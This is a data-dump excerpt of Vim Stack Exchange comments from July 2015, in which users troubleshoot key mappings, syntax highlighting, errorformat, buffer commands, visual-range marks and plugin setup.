  <row Id="5848" PostId="4035" Score="3" Text="`&lt;CR&gt;` is Enter, not  Control ... and I think you will need to remap Ctrl to Space at OS level." CreationDate="2015-07-24T23:08:48.533" UserId="1800" />
  <row Id="5849" PostId="4035" Score="0" Text="oh…i think i mistake one for another" CreationDate="2015-07-24T23:13:29.283" UserId="2206" />
  <row Id="5850" PostId="4035" Score="0" Text="@VanLaser But,even when I change the &lt;CR&gt; to &lt;C&gt;, it still doesn't work. Why?" CreationDate="2015-07-24T23:30:39.800" UserId="2206" />
  <row Id="5851" PostId="4035" Score="6" Text="Because ctrl key by itself cannot be mapped in vim.  It has to be in conjunction with another letter eg. `&lt;C-e&gt;`.  You will have to remap it at OS level, like @VanLaser said." CreationDate="2015-07-25T01:13:15.893" UserId="865" />
  <row Id="5852" PostId="715" Score="0" Text="what it is fortune -a ??" CreationDate="2015-07-25T14:37:49.527" UserId="2952" />
  <row Id="5853" PostId="715" Score="0" Text="@regedarek It displays a random joke. See:  https://en.wikipedia.org/wiki/Fortune_(Unix)" CreationDate="2015-07-25T15:47:15.300" UserId="51" />
  <row Id="5862" PostId="4038" Score="1" Text="This is a very old and very easy to google [&quot;issue&quot;](https://groups.google.com/forum/#!topic/vim_dev/sppdpElxY44). Please try a little harder next time." CreationDate="2015-07-26T18:49:46.770" UserId="54" />
  <row Id="5864" PostId="4038" Score="0" Text="@romainl whoa!! Thanks for the link! I assumed `4193` was some random name and not reproable. That's incredible. Please post as an answer and I'll accept." CreationDate="2015-07-26T20:44:30.120" UserId="142" />
  <row Id="5865" PostId="4038" Score="2" Text="Why is this a bug? Rethink your file watcher to allow other programs to do their job as they can. Vim isn't doing something forbidden." CreationDate="2015-07-27T09:48:13.977" UserId="1800" />
  <row Id="5866" PostId="4041" Score="0" Text="It seems like `Vundle` didn't get installed properly, leading to ever `Vundle` command failing. How did you install `Vundle`, and what does your `.vimrc` contain?" CreationDate="2015-07-27T11:01:37.820" UserId="205" />
  <row Id="5867" PostId="4042" Score="0" Text="But Vundle is installed :-/. Vim works, I am working with Vim!! And I work inside vagrant machine." CreationDate="2015-07-27T17:03:50.237" UserId="2965" />
  <row Id="5868" PostId="4041" Score="2" Text="What is the value of `$EDITOR`? Is it `vim` or `vi`?" CreationDate="2015-07-27T17:24:09.633" UserId="778" />
  <row Id="5869" PostId="4038" Score="0" Text="@VanLaser: Yep, I've since added exceptions for `4913` and friends. The bug is that the file is called `4913` instead of `.vim_permissions_test`. I'm certain that I'm not the first person confused by such a filename. Just because it's not forbidden doesn't mean it's not unwise." CreationDate="2015-07-27T17:32:36.053" UserId="142" />
  <row Id="5870" PostId="4042" Score="0" Text="Oh I'm sorry I didn't understand that, my bad. Peter's comment on your question might be a better approach then." CreationDate="2015-07-27T17:56:48.520" UserId="1841" />
  <row Id="5871" PostId="4044" Score="3" Text="Does the order have anything to say? That is, what if you move the `highlight` commands to the bottom of the `vimrc` file?" CreationDate="2015-07-27T20:16:19.620" UserId="21" />
  <row Id="5872" PostId="4044" Score="0" Text="@KarlYngveLervåg No, that doesn't change anything." CreationDate="2015-07-27T21:08:07.893" UserId="2347" />
  <row Id="5873" PostId="4044" Score="1" Text="After starting Vim, what does `:verbose hi Comment` tell you?" CreationDate="2015-07-27T21:16:57.010" UserId="1306" />
  <row Id="5874" PostId="4044" Score="0" Text="@jjaderberg :verbose hi Comment&#xA;Comment        xxx term=bold ctermfg=14 guifg=#80a0ff&#xA;        Last set from /usr/local/share/vim/vim74/syntax/syncolor.vim" CreationDate="2015-07-27T21:20:28.563" UserId="2347" />
  <row Id="5875" PostId="4044" Score="0" Text="Is it perhaps [this issue](http://vi.stackexchange.com/q/3355/51)?" CreationDate="2015-07-27T21:25:27.600" UserId="51" />
  <row Id="5876" PostId="4044" Score="0" Text="Then that file is loaded after your vimrc and overrides your highlight instruction. When you re-source your vimrc your instruction is the last one and is then in effect. Somewhere in the files listed by the `:scriptnames` command is a script which loads that file. What does `:echo colors_name` tell you?" CreationDate="2015-07-27T21:28:02.237" UserId="1306" />
  <row Id="5877" PostId="4044" Score="0" Text="@jjaderberg :echo colors_name says &quot;E121: Undefined variable: colors_name&quot; followed by &quot;E15: Invalid expression: colors_name&quot;" CreationDate="2015-07-27T21:32:20.703" UserId="2347" />
  <row Id="5878" PostId="4044" Score="0" Text="This may be due to patches 757, 766 and 770 that were applied in late June and early July. They allow Vim to query the terminal's background color. I haven't updated since 729 so I can't verify. The feature uses T_RBG, so `:helpgrep \ct_rbg` may tell you something about it. `:verbose set bg?` may tell you something, too." CreationDate="2015-07-27T21:45:57.620" UserId="2055" />
  <row Id="5879" PostId="4038" Score="0" Text="Yes, I just wanted to say that it's not clear what your program / file watcher is doing, and why the fact that another program (i.e. vim) creates some temporary files would be &quot;alarming&quot; and &quot;a prohibitive bug&quot;. Is your program actually a vim plugin? (this isn't something important, just unclear)" CreationDate="2015-07-27T21:48:02.643" UserId="1800" />
  <row Id="5880" PostId="4044" Score="0" Text="Then most likely no colorscheme is loaded, but the `:syntax reset` command has been run, and it has been run after your vimrc is loaded. That command involves sourcing that `syncolor.vim` file and if you look at that you see a line that sets Comment to cyan when 'background' is 'dark'. What you see is a default but I'm not sure why the default is loaded after your vimrc. I can't pursue it now, but look at that file and you should be able to trace back when it is loaded and why." CreationDate="2015-07-27T21:51:38.183" UserId="1306" />
  <row Id="5881" PostId="4044" Score="0" Text="I just updated my Vim to 797 and verified the OP's problem. The problem is not there with 729 but is with 797. I'm also using xterm 318." CreationDate="2015-07-27T22:01:05.773" UserId="2055" />
  <row Id="5882" PostId="4044" Score="0" Text="@garyjohn Bingo! Adding &quot;set background=dark&quot; to somewhere before all the highlight commands does make the specified colors work again. If you make this or something to the effect an answer I'm happy to up your vim karma." CreationDate="2015-07-27T22:04:18.687" UserId="2347" />
  <row Id="5883" PostId="4044" Score="0" Text="Great! I'll post an answer. Setting 'background' to either light or dark seems to work, but what you used to have was light." CreationDate="2015-07-27T22:09:18.377" UserId="2055" />
  <row Id="5884" PostId="4046" Score="1" Text="`:bufdo` doesn't know about tabs, it opens every buffer in the current tab and runs your command on it. The `#` refers to the &quot;alternate file name&quot;, which is the &quot;last file name&quot; AFAIK. It's to easily switch between 2 files (like `cd -`). This is a &quot;buffer-based workflow&quot; versus a &quot;tab-based workflow&quot; thing (they don't always mix very well)." CreationDate="2015-07-28T12:52:28.633" UserId="51" />
  <row Id="5885" PostId="4046" Score="0" Text="I see. So in this case `tabdo` would be the way to go." CreationDate="2015-07-28T13:07:43.653" UserId="1066" />
  <row Id="5887" PostId="4051" Score="0" Text="This is certainly a start, but I make frequent use of the equation, align, and IEEEeqnarray environments, and I don't want to exclude those from my search." CreationDate="2015-07-28T18:23:22.293" UserId="2976" />
  <row Id="5888" PostId="4051" Score="0" Text="@RobF.: it's quite possible to match inside a range of environments, but it's not going to be easy unless one scripts it. If, however, you consistently use `\mathit` around variable names, finding them is much easier." CreationDate="2015-07-28T18:33:06.070" UserId="2942" />
  <row Id="5889" PostId="4052" Score="0" Text="Wow! It worked! Thanks so much! If possible, can you please explain the solution a bit more? As i understand, dots (.) are used for string concatenation, right? And instead of escaping all spaces etc., errorformat string is surrounded by quotes. But what does `%\%%` sequence mean? And what is the difference between `let &amp;errorformat` and `CompilerSet errorformat`? (the latter does not work with the efm string specified above)." CreationDate="2015-07-28T20:35:17.360" UserId="2725" />
  <row Id="5890" PostId="4050" Score="1" Text="I think the answer is no: there is no _easy_ way to limit a search to a specific syntax region." CreationDate="2015-07-28T20:44:44.320" UserId="21" />
  <row Id="5891" PostId="4052" Score="1" Text="@siphiuel If you read the docs, you will find that the errorformats are tried consecutively until one matches. The first entries have highest priority. Thus the solution by @lcd047 consists of 4 entries, where the first one matches errors that contains the `compileJava` or `compileTarget` lines. The second matches the other errors, the third defines a &quot;pointer line&quot; and the end of en error message, and the final entry says to ignore every remaining lines." CreationDate="2015-07-28T20:49:23.823" UserId="21" />
  <row Id="5892" PostId="4046" Score="0" Text="Perhaps also use `setlocal` instead of `set`?  It doesn't make much sense to set the same global option several times." CreationDate="2015-07-28T20:58:26.950" UserId="2313" />
  <row Id="5893" PostId="4053" Score="4" Text="Something like this, perhaps: https://github.com/coderifous/textobj-word-column.vim" CreationDate="2015-07-28T22:42:33.790" UserId="1800" />
  <row Id="5894" PostId="4053" Score="0" Text="@VanLaser That comment sure sounds like an answer." CreationDate="2015-07-29T00:16:10.003" UserId="268" />
  <row Id="5895" PostId="4057" Score="1" Text="Yay for `:pc`! I didn't realise that the &quot;preview&quot; name was special." CreationDate="2015-07-29T03:07:05.827" UserId="205" />
  <row Id="5896" PostId="4058" Score="0" Text="What do you mean by &quot;refuse&quot;? What happens exactly?" CreationDate="2015-07-29T07:23:28.207" UserId="54" />
  <row Id="5897" PostId="4060" Score="0" Text="[This answer](http://vi.stackexchange.com/a/4043/1841) might be related: It seems that it is not possible to map `ctrl` on its own... I'm curious but why do you need to disable this key?" CreationDate="2015-07-29T07:43:01.857" UserId="1841" />
  <row Id="5898" PostId="4060" Score="0" Text="I've quite big hands and after a day of work my pinky hurts. So I want to force myself to use more ergonomical alternatives." CreationDate="2015-07-29T08:00:59.990" UserId="153" />
  <row Id="5899" PostId="4060" Score="1" Text="I would have understand that with an [emacs user](https://en.wikipedia.org/wiki/Emacs#Emacs_pinky) but with vim I'm pretty surprised it has never been a problem for me... Anyway maybe you'll be interested in the function of the answer I linked in my previous comment which remaps all the combination of keys between `&lt;C-a&gt;` and `&lt;C-z&gt;` to `&lt;Space-a&gt;` to `&lt;Space-z&gt;`" CreationDate="2015-07-29T08:06:37.503" UserId="1841" />
  <row Id="5900" PostId="4053" Score="0" Text="Ok, I added an answer based on this." CreationDate="2015-07-29T09:32:21.350" UserId="1800" />
  <row Id="5901" PostId="4058" Score="0" Text="@romainl just an `a` gets input in my example." CreationDate="2015-07-29T11:57:22.780" UserId="1097" />
  <row Id="5903" PostId="4060" Score="1" Text="Use your operating system's facilities for this? For example xmodmap on Linux." CreationDate="2015-07-29T12:59:10.480" UserId="51" />
  <row Id="5904" PostId="4055" Score="1" Text="KISS: `:nnoremap &lt;silent&gt; * :let @/='\C\&lt;' . expand('&lt;cword&gt;') . '\&gt;'&lt;CR&gt;n` (the last S stands for &quot;solution&quot;;)" CreationDate="2015-07-29T13:17:18.700" UserId="599" />
  <row Id="5905" PostId="4056" Score="1" Text="Something that might make `Ctrl` less annoying is remapping `Caps Lock` to `Ctrl` or swapping them if you want to keep `Caps Lock` available." CreationDate="2015-07-29T13:35:26.953" UserId="2736" />
  <row Id="5906" PostId="4066" Score="1" Text="What does your 'makeprg' look like (`:set makeprg?`)? What command exactly is executed when you do `:make build`?" CreationDate="2015-07-29T16:12:54.057" UserId="1306" />
  <row Id="5907" PostId="4061" Score="0" Text="`:bufdo` will make last processed buffer the current buffer. If the `:make` command that you are redoing refers to &quot;current buffer&quot; or &quot;file of current buffer&quot;, or if making the last processed buffer the current buffer involves changes to 'pwd' or other pertinent options you may end up running a different command than intended." CreationDate="2015-07-29T16:18:40.507" UserId="1306" />
  <row Id="5908" PostId="4068" Score="0" Text="there was a space before `!`. it is like, `:'&lt;,'&gt; !tee &gt;(xsel -b)`" CreationDate="2015-07-29T16:56:27.237" UserId="2988" />
  <row Id="5909" PostId="4068" Score="0" Text="@MadhavanKumar: you can have spaces between the range and the command." CreationDate="2015-07-29T16:57:47.467" UserId="2942" />
  <row Id="5910" PostId="4068" Score="0" Text="Are you sure you're not mixing up &quot;!-filter&quot; and &quot;!-command&quot;? See `:help !` and `:help :!`. Filter takes a range (`:help :range!`). I don't understand why one would use `'&gt;,'&gt;` for a range, however, or how this particular command is supposed to work." CreationDate="2015-07-29T17:12:53.403" UserId="1306" />
  <row Id="5911" PostId="4067" Score="0" Text="Apart from answering your question, have you looked at http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim for how to yank visual selection to system clipboard?" CreationDate="2015-07-29T17:15:01.200" UserId="1306" />
  <row Id="5912" PostId="4068" Score="0" Text="@jjaderberg: yes, I did, thank you for pointing that out. I thought something looked off when I wrote that paragraph, but I didn't think to look at `:h range!`. I'll put on my thinking hat again." CreationDate="2015-07-29T17:24:53.713" UserId="2942" />
  <row Id="5913" PostId="4068" Score="0" Text="Well the question is about visual selection marks and you have partially answered that. What I don't understand is how `'&gt;,'&gt;`, ie &quot;from last line of last visual selection to last line of last visual selection&quot;, can work for OP. Strictly the answer is &quot;The one selects from beginning to end of last visual selection, the other from end to end&quot;, so if you add that and references to relevant help topics you have answered the question. If your thinking hat yields result I'd be interested to know how/why OPs command works." CreationDate="2015-07-29T17:50:44.047" UserId="1306" />
  <row Id="5914" PostId="4068" Score="0" Text="PS Usually (f.i., in a visual mode mapping) these mark motions don't work for a &quot;currently highlighted&quot; area–you have to add `&lt;Esc&gt;` to the mapping to leave visual mode first. The `:h v_:` case is different though. Also, I can't follow up now, but a possible reason why OPs command works is that a mark motion initiated with `'` (as opposed to &quot;`&quot;) is linewise. Visually select a char, escape visual mode and `d'&gt;` will delete the entire line. If OP visually selected exactly one line, it may make sense that he finds in clipboard what he expects. No idea if that's what's happening." CreationDate="2015-07-29T18:04:43.030" UserId="1306" />
  <row Id="5915" PostId="4068" Score="0" Text="There's a thunderstorm and I shut down my equipment in the middle of editing that comment. I got the &quot;escaped backtick&quot; all wrong and I can't change it now, I hope it's legible despite the terrible mark(up|down) (single-quote is linewise, as opposed to backtick–that was the point)." CreationDate="2015-07-29T18:26:22.977" UserId="1306" />
  <row Id="5916" PostId="4068" Score="0" Text="@jjaderberg: I can't convince myself that I've reproduced the OPs setup well enough, but I think you have it there. I'll amend the answer along those lines. BTW: I was thinking of when you initiate a `:` command while you have a selection in Visual mode, but that's neither here or there, really." CreationDate="2015-07-29T18:43:02.260" UserId="2942" />
  <row Id="5917" PostId="4068" Score="0" Text="That seems a good answer to me. Maybe someone else can a) confirm or deny that the `'&gt;,'&gt;` is equivalent to the last line of a selection (`iaaa&lt;Esc&gt;hv:&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Bs&gt;&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;d&lt;Cr&gt;` on empty buffer–i.e. visually select a char on a line, enter cmd-line mode, change the range to `'&gt;,'&gt;`, add `d` for a command, run it–tells me that it is) and b) explain why OPs command does not work with the standard `'&lt;,'&gt;` range. But that would be sugar, you've answered the actual question asked." CreationDate="2015-07-29T19:13:17.830" UserId="1306" />
  <row Id="5918" PostId="4074" Score="0" Text="Here I've written a perfectly good troubleshooting answer, and you come and sideline me with a simple issue reference ;-) +1 (Though, since you patched it, would you consider adding the relevant part of the patch to your answer for those who will not or cannot easily build/acquire a newer version of vim?)" CreationDate="2015-07-29T20:06:02.900" UserId="1306" />
  <row Id="5920" PostId="4055" Score="0" Text="@Vitor I like the idea of your solution because it doesn't clobber the jump registers, but it doesn't seem to work: after executing that `nnoremap`, the `*` key doesn't seem to do anything." CreationDate="2015-07-29T21:27:59.757" UserId="2982" />
  <row Id="5921" PostId="4055" Score="0" Text="@Vitor Oops, I put the `&lt;silent&gt;` in the wrong place -- as did garyjohn! Your code works well, thanks." CreationDate="2015-07-29T21:35:52.097" UserId="2982" />
  <row Id="5922" PostId="4073" Score="0" Text="*&quot;I got no idea why there are some c++ highlights in c.vim&quot;* -&gt; C and C++ share a lot of syntax; at some point someone decided that putting them in the same syntax file was a good idea (`cpp.vim` sources `c.vim`) ... There's something to be said for that ..." CreationDate="2015-07-29T21:44:21.773" UserId="51" />
  <row Id="5923" PostId="4075" Score="2" Text="Fully autocompleting Ruby is much harder than C++ due to the dynamic nature of Ruby. Rails uses quite a bit of the &quot;meta-programming&quot; features of Ruby. For example, [completing something like this](https://github.com/rails/rails/blob/master/actionview/lib/action_view/helpers/form_helper.rb#L1344) will be very hard unless you're running a full Rails application." CreationDate="2015-07-29T21:52:28.623" UserId="51" />
  <row Id="5924" PostId="4061" Score="0" Text="Instead of `bufdo w` you could `wall` and avoid changing buffer." CreationDate="2015-07-29T22:06:15.943" UserId="630" />
  <row Id="5925" PostId="4067" Score="0" Text="thanks for the link.. it helps really.." CreationDate="2015-07-29T22:13:36.693" UserId="2988" />
  <row Id="5926" PostId="4072" Score="0" Text="The part about knowing the length of the status line when building it only works when it doesn't contain things like `'%c'`, since those are calculated by vim afterwards.  However, those special status line characters can be emulated by vimscript most of the time, it just removes the convenience of them." CreationDate="2015-07-29T22:19:43.703" UserId="865" />
  <row Id="5927" PostId="4056" Score="0" Text="Which plugin you use for python code complete? For example `jedi-vim` have option `g:jedi#auto_close_doc`." CreationDate="2015-07-29T22:24:05.463" UserId="1145" />
  <row Id="5928" PostId="4072" Score="0" Text="Yes, that's inconvenient (and can be circumvented, as you say). That's why I used `expand('%')` as example, instead of `%f`. The thing is, Vim doesn't seem to allow peeking at the *evaluated* statusline anywhere (e.g. to get its length)." CreationDate="2015-07-29T22:27:34.133" UserId="1800" />
  <row Id="5929" PostId="4050" Score="1" Text="[This mapping](http://vim.wikia.com/wiki/VimTip99) uses `synIDattr()` to obtain syntax groups for the character under the cursor. You could write a function that performs the search (or does `normal n`) and then uses `synIDattr()` to decide whether to stay at this location, or continue the search forwards." CreationDate="2015-07-29T22:45:00.503" UserId="630" />
  <row Id="5930" PostId="4047" Score="0" Text="If you hate that behaviour of `:bufdo` then you can use [my `:BufDo` command](https://github.com/joeytwiddle/rc_files/blob/77f1e3e79c89105716f2e9cd7d6414b3237d9e05/.vim/plugin/joeycommands.vim#L161-175) which returns you to the buffer you started on." CreationDate="2015-07-29T22:52:14.577" UserId="630" />
  <row Id="5931" PostId="4077" Score="0" Text="Vim seems to only offer one level of MRU file history, exposed on CTRL-^.  However I have noticed when using `:kwbd` to close a few buffers, that Vim does step back to the previous buffers in the expected reverse-historical order.  Perhaps Vim has a MRU list which it isn't sharing with us, or perhaps it chooses which buffer to fall back to based on the CTRL-O location history (`:jumps`)." CreationDate="2015-07-29T23:27:24.623" UserId="630" />
  <row Id="5932" PostId="4023" Score="0" Text="To avoid the CTRL-C issue, you could run MacVim instead. Or you could redefine rope's mappings to start with a different prefix key." CreationDate="2015-07-29T23:44:02.263" UserId="630" />
  <row Id="5933" PostId="3997" Score="0" Text="I do something similar [with a mapping](https://github.com/joeytwiddle/rc_files/blob/eeb3fdf0f7040d29b02f9de62d0398355f49fc8c/.vim/ftplugin/javascript.vim#L18-22).  My version clobbers the default register, but we could clobber a different register, e.g. `l` by using `&quot;ly` instead of `y` and `&lt;C-R&gt;l` instead of `&lt;C-R&gt;&quot;`." CreationDate="2015-07-30T00:14:25.153" UserId="630" />
  <row Id="5934" PostId="4076" Score="0" Text="I wasn't aware of `:wa`, thought writing all changed buffers would be more complicated!" CreationDate="2015-07-30T06:45:27.697" UserId="2357" />
  <row Id="5935" PostId="4081" Score="1" Text="You probably updated your terminal emulator to send the escape key on Alt. See: [How to map Alt key?](http://vi.stackexchange.com/q/2350/51) and [`:help :map-alt-keys`](http://vimhelp.appspot.com/map.txt.html#%3amap%2dalt%2dkeys)" CreationDate="2015-07-30T09:49:39.793" UserId="51" />
  <row Id="5936" PostId="4081" Score="0" Text="Ah thanks for that, back to normal now." CreationDate="2015-07-30T09:55:42.637" UserId="2997" />
  <row Id="5937" PostId="3174" Score="0" Text="Same issue here with Vim 7.4 on Debian 8. Is this worth a bugreport?" CreationDate="2015-07-30T10:34:50.413" UserId="2978" />
  <row Id="5938" PostId="4081" Score="0" Text="You could add your solution to the other question as an answer, if it's different from the existing answers so that people with the same problem are able to find it :-)" CreationDate="2015-07-30T10:58:08.487" UserId="51" />
  <row Id="5939" PostId="4081" Score="0" Text="Yea so my issue was slightly different, I needed to update my terminal settings to disable 'Use Option as Meta Key' which had been enabled somehow. I just happened to get to that solution through `:help :map-alt-keys`" CreationDate="2015-07-30T11:02:02.510" UserId="2997" />
  <row Id="5940" PostId="4066" Score="0" Text="@jjaderberg - thank you. Seems that `makeprg` was set to `make` instead of `gradle` for some reason. Everything works fine now" CreationDate="2015-07-30T11:03:13.567" UserId="2725" />
  <row Id="5941" PostId="4081" Score="1" Text="That's exactly the same solution as the OP used in the other question ;-)" CreationDate="2015-07-30T12:12:14.997" UserId="51" />
  <row Id="5942" PostId="4081" Score="0" Text="haha, sure is! Saw the top voted comment not the accepted answer. Cheers!" CreationDate="2015-07-30T12:13:51.327" UserId="2997" />
  <row Id="5943" PostId="4023" Score="0" Text="Actually, I'm thinking that this might be due to rope not being compatible with python3, and my vim being compiled with only python3." CreationDate="2015-07-30T12:49:07.613" UserId="69" />
  <row Id="5944" PostId="4056" Score="0" Text="@AlexKroll to be honest, I have no idea. I think it might be Supertab. These are the plugins I've installed: https://github.com/murukeshm/vimrc/tree/master/bundle. I don't have Jedi installed." CreationDate="2015-07-30T12:52:03.023" UserId="205" />
  <row Id="5945" PostId="4056" Score="1" Text="@muru `g:SuperTabClosePreviewOnPopupClose (default 0)`&#xA;Looks like it's what you want `:he supertab-closepreviewonpopupclose`" CreationDate="2015-07-30T12:59:54.023" UserId="1145" />
  <row Id="5947" PostId="2914" Score="0" Text="@jecxjo instead of `v$xh` you could just use `D`." CreationDate="2015-07-30T14:36:31.733" UserId="2620" />
  <row Id="5951" PostId="2285" Score="0" Text="@jalanb Thanks! I tried it out and it seemed to work fine without it, so I removed it in the code above." CreationDate="2015-07-30T17:12:37.020" UserId="1111" />
  <row Id="5952" PostId="4091" Score="0" Text="Here's an old discussion highlighting the pro's and con's of such an approach, and suggesting instead something that today could be translated as: multiple vim instances (one per project/buffer list) + tmux: http://vim.1045645.n5.nabble.com/Different-buffer-list-for-different-tabs-td1178136.html" CreationDate="2015-07-30T17:24:41.293" UserId="1800" />
  <row Id="5953" PostId="4095" Score="0" Text="+1 for introducing me to redir. :D" CreationDate="2015-07-30T18:24:28.057" UserId="72" />
  <row Id="5954" PostId="4060" Score="4" Text="Personally, I find that having the control key immediately to the left of 'A' (where caps lock is on most modern keyboards) a lot more convenient than its usual location below the left shift key. I've discussed ways of remapping it on various systems [here](http://the-flat-trantor-society.blogspot.com/2013/12/where-should-control-key-be.html)." CreationDate="2015-07-30T18:24:38.797" UserId="2380" />
  <row Id="5955" PostId="4074" Score="0" Text="I am neither reponsible for the bug nor the fix. I just remembered the issue. But the easiest fix is get a newer Vim, because it will contain updated runtime files. The second best option is to manually download the file from github/googlecode/ftp.vim.org and put it into your ~/.vim/syntax/ directory. This has the disadvantage, that you don't get updated syntax files, once you update your vim later." CreationDate="2015-07-30T18:57:15.050" UserId="71" />
  <row Id="5956" PostId="4100" Score="0" Text="so far commentary is very useful, thanks for the suggestion." CreationDate="2015-07-30T19:45:26.700" UserId="3005" />
  <row Id="5957" PostId="4102" Score="0" Text="Buffer commands like `:b` can take partial filenames. Then use `&lt;tab&gt;` completion to deal with multiple matches. No more worrying about `:ls`." CreationDate="2015-07-30T19:46:41.967" UserId="778" />
  <row Id="5958" PostId="4102" Score="0" Text="@Peter. That's very true and I use that all the time. The problem is though that I am dealing with OS code and file names get pretty ugly and pretty meaningless. :D Sometimes I want to see the filename I need to switch to and that's where GUI's &quot;Buffers&quot; menu is helpful." CreationDate="2015-07-30T20:17:33.013" UserId="3006" />
  <row Id="5959" PostId="4104" Score="3" Text="Did you try inserting a literal tab character in the regexp? With `&lt;C-v&gt;&lt;Tab&gt;`?" CreationDate="2015-07-30T22:27:49.683" UserId="51" />
  <row Id="5961" PostId="4102" Score="1" Text="Why not simply use netrw? `:Ex`, see `:help netrw`." CreationDate="2015-07-31T07:23:20.490" UserId="54" />
  <row Id="5962" PostId="4091" Score="0" Text="@VanLaser: Thanks for the link it's an interesting discussion! I actually include tmux and different vim instances when I'm on my personal machine. My question comes from the fact that I have to use windows for my professional work and I **really** don't like how the windows are handled: using `alt+tab` (or even worse the mouse) feels much less easy than switching tab within vim." CreationDate="2015-07-31T07:27:56.900" UserId="1841" />
  <row Id="5963" PostId="4097" Score="0" Text="I agree with the idea that using separate vim instances is better when I can use it in a terminal, as I said in another comment I have to use windows on my professional computer and switching between gvim instances is a pain in the butt with this OS. I'll take a look at the arguments I've never used it before and that might be a good workaround, thanks!" CreationDate="2015-07-31T07:31:06.750" UserId="1841" />
  <row Id="5964" PostId="4092" Score="0" Text="I didn't find a plugin neither and I was hoping for a built-in feature to do so but it seems that you're right I'll probably have to do it by myself. Thanks for your code I might use it has a base to develop a full plugin." CreationDate="2015-07-31T07:34:36.030" UserId="1841" />
  <row Id="5965" PostId="4104" Score="0" Text="Your syntax command line works for me, highlighting everything from the tab to the end of the line. I'm on Vim 7.4 too." CreationDate="2015-07-31T09:29:29.270" UserId="2942" />
  <row Id="5966" PostId="4108" Score="0" Text="If I understand your question correctly, this is the same as [How to achieve selection different length of texts on different lines](http://vi.stackexchange.com/q/2796/51)?" CreationDate="2015-07-31T09:45:40.660" UserId="51" />
  <row Id="5967" PostId="2085" Score="0" Text="How to get rid of the split?? :-/" CreationDate="2015-07-31T09:58:37.783" UserId="3012" />
  <row Id="5968" PostId="2085" Score="0" Text="See: [GNU Screen Splitting](http://tomlee.co/2011/10/gnu-screen-splitting/)" CreationDate="2015-07-31T10:00:14.300" UserId="467" />
  <row Id="5969" PostId="4108" Score="0" Text="No, it's not possible." CreationDate="2015-07-31T10:31:43.787" UserId="54" />
  <row Id="5970" PostId="4091" Score="0" Text="*Maybe* [vim-ctrlspace](https://github.com/szw/vim-ctrlspace) can help - it advertises per tabpage buffer lists; I don't use it, though." CreationDate="2015-07-31T10:33:56.523" UserId="1800" />
  <row Id="5972" PostId="4066" Score="0" Text="Solved by comment from @jjaderberg" CreationDate="2015-07-31T08:56:41.190" UserId="2725" />
  <row Id="5973" PostId="4066" Score="1" Text="@siphiuel I think you did something with `makeprg`, but what? Could you post what you did to fix it as an answer? That was other people will be able to find it and benefit from it :-)" CreationDate="2015-07-31T11:41:00.830" UserId="51" />
  <row Id="5974" PostId="4091" Score="0" Text="I'll give it a try thanks." CreationDate="2015-07-31T12:39:55.127" UserId="1841" />
  <row Id="5975" PostId="4102" Score="0" Text="@romainl. Thank you for the response. I use `:Vex` and `:Sex` frequently as well. They serve a different purpose however: files are not in the same directory and can be pretty spread out." CreationDate="2015-07-31T12:44:51.233" UserId="3006" />
  <row Id="5976" PostId="4111" Score="1" Text="Your question might be also closed because SE sites are for precises questions and yours might be too broad. Other than that Pratical Vim is an **amazing** book and reading it is a really good idea. After that I think the best way to learn is to use vim daily and each time you find something which feels unatural (or against vim philosophy) you note it down and try to find a better way to do it." CreationDate="2015-07-31T13:06:58.343" UserId="1841" />
  <row Id="5977" PostId="4066" Score="0" Text="Added a proper answer. Thanks for putting this in order. I must admit that first i didn't properly understand what fixed it exactly:). But comments pointed in the right direction. Thanks again everyone." CreationDate="2015-07-31T13:16:33.947" UserId="2725" />
  <row Id="5978" PostId="4116" Score="7" Text="Unlike some implementations of regular expression engines, Vim's doesn't seem to support that notation. `[[:space:][:alnum:]_]` can be used to approximate the collection of `\s` and `\w`, though." CreationDate="2015-07-31T14:36:14.073" UserId="2942" />
  <row Id="5979" PostId="4104" Score="0" Text="That's interesting... I did try `&lt;C-v&gt;&lt;Tab&gt;`, yes, sorry for missing that. It inserts a `^I` character, and it doesn't work either." CreationDate="2015-07-31T15:38:55.267" UserId="2036" />
  <row Id="5980" PostId="4117" Score="1" Text="Just because one can construct an invalid range in a character class doesn't mean that it shouldn't be possible to use something like `\s` in a character class.  Vim's regex implementation happens to have made that choice, but other implementations allow you to use `[\s]`." CreationDate="2015-07-31T16:46:15.210" UserId="15" />
  <row Id="5981" PostId="4117" Score="0" Text="That's good to know, thanks." CreationDate="2015-07-31T17:24:39.813" UserId="1800" />
  <row Id="5982" PostId="4123" Score="0" Text="Hey cool way to improve it! I didn't know you can do that." CreationDate="2015-07-31T18:20:18.873" UserId="1841" />
  <row Id="5983" PostId="3865" Score="1" Text="... and the explanation: when `paste` is on, Insert mode mappings are disabled (as per Vim's help)" CreationDate="2015-07-31T18:34:34.863" UserId="1800" />
  <row Id="5984" PostId="4123" Score="1" Text="You could even split the group in 2 parts and remove the `else` branch, by running  the `autocmd!` unconditionally at the beginning." CreationDate="2015-07-31T18:58:55.357" UserId="1800" />
  <row Id="5985" PostId="4123" Score="0" Text="@VanLaser Could you?  Have you tried doing it that way?  Hint: what would `exists('#TestAutoGroup#BufEnter')` return after an `autocmd!`?" CreationDate="2015-07-31T19:08:04.887" UserId="2313" />
  <row Id="5986" PostId="4056" Score="0" Text="@AlexKroll Yes, that did the trick, thanks!" CreationDate="2015-07-31T19:11:51.000" UserId="205" />
  <row Id="5987" PostId="4123" Score="0" Text="Indeed, the `if` would be executed every time. Would work with a global variable, though. I just feel the need to help, when I see repeating lines of code, even if I'm proved wrong (but this is how I learn)." CreationDate="2015-07-31T19:13:01.283" UserId="1800" />
  <row Id="5988" PostId="4123" Score="1" Text="Something like this, maybe: http://pastebin.com/HEEYjseR" CreationDate="2015-07-31T19:20:39.700" UserId="1800" />
  <row Id="5989" PostId="4125" Score="0" Text="I'm not sure to understand why you think it is an easy way: I'm not a vimscript master so your syntax seems a little bit overcomplicated to me. What are the pros of you method?" CreationDate="2015-07-31T19:28:07.323" UserId="1841" />
  <row Id="5990" PostId="4125" Score="0" Text="Pros: 1) No function. 2) Can easily be adapted to use a buffer/window local variables instead of a global variable. 3) Simple mapping" CreationDate="2015-07-31T20:32:08.423" UserId="778" />
  <row Id="5991" PostId="4028" Score="1" Text="You might be better off just putting your vimrc in the rc folder and using a symlink for ~/.vimrc, like so: `ln -s ~/rc/vimrc ~/.vimrc`. That way, you don't have to worry about copying it back and forth from ~ and rc." CreationDate="2015-07-31T23:22:31.623" UserId="2736" />
